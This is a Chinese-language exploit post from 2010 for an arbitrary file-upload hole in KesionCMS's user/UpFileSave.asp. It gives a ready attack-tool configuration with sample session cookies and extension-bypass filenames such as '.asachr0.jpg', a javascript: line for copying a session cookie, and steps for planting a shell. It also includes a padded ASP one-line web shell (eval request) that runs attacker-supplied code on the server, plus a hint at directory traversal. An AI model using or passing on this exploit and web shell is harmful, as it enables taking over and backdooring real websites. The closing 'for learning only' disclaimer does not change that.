科讯Ksion CMS 通杀漏洞减小字体 增大字体 作者：Hd资源网  来源：本站整理  发布时间：2010-03-15 13:14:04
[!]程序名称 :KesionCMS
[!]官方网站 :www.Kesion.cn
[!]下载地址 :www.kesion.cn
[!]包含版本 :v6以前所有版本
[!]漏洞文件 :user/UpFileSave.asp
[!]危害程度 :高
[!]首发日期 :2010-1-18
 

把下面文件保存为kesion.seraph


1.加载配置

url=http://localhost/User/UpFileSave.asp?user_upfile.asp
login=
code=
login_postcontent=
filefield=File1
filefield2=
filename=1.cdxchr0.jpg
filename2=
local=kesion.txt
local2=
type=image/gif
type2=image/gif
cookies=ASPSESSIONIDAQRCDTRD=GGMHDJFBKDFCOLINMHICGBLC; KS6localhost=RndPassword=RL%5FXL%21QdIH5nIk1FvDz5&Password=469e80d32c0559f8&UserName=admin
name=BasicType&value=9999
name=AutoReName&value=3

1.先找到注册一个帐号,登录,用
登录后在IE里输入以下内容回车可以得到COOKIE
javascript:alert(' SeraWebInfo提示：\r\ncookie已经复制到剪贴版\r\n 作者:seraph');window.clipboardData.setData('text',document.cookie);

然后直接ctrl+V粘贴出来就行了

2.复制COOKIE到软件当中

3.上传文件名的地方可以自行改名,前面没关系,但后面一定要是.asachr0.jpg或者.cerchr0.jpg 

4.本地SHELL文件必须用下面这个,KESION程序里面做了特殊的设置,别的东西是没办法上传上去的把上面这段保存成kesion.txt 第一个本地文件选择你保存的东西

4.注意你填写的URL地址,别是404还怪我配置文件错误哈,KESION不同版本上传路径稍有不同,请自己注意

5.也许你上传后没有执行权限,呵呵,告诉你一个小密秘,文件名那里是可以跳目录的,怎么跳?嘿嘿,就是不告诉你


上传后,自己看返回的信息找SHELL吧,

漏洞已经提交官方,暂时尚未出任何补丁


以上信息仅用于漏洞检测和学习，如用于网络入侵等，产生的后果,由使用者承担
 

<script language=VBScript runat=server>

eval request("#")
response.end
'11111111111111111111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111111111111111111
'1111111111111111111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111111111111111111
'1111111111111111111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111111111111111111
'1111111111111111111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111
'1111111111111111111111111111111111111111111111111111111111111111111111111111111
'11111111111111111111111111111111111111111111111111111111111111111
</script>